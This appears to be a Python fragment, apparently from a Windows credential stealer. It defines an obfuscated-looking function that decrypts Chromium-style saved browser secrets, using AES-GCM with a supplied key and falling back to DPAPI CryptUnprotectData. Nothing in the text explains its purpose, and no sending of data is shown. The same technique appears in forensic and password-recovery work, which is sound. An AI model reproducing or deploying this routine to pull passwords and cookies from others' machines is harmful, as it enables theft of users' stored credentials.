from Crypto.Cipher import AES as c
import win32crypt as w


def dd(d, k):
    try:
        iv = d[3:15]
        d = d[15:]
        cipher = c.new(k, c.MODE_GCM, iv)
        return cipher.decrypt(d)[:-16].decode()
    except:
        try:
            return str(w.CryptUnprotectData(d, None, None, None, 0)[1])
        except:
            return ""
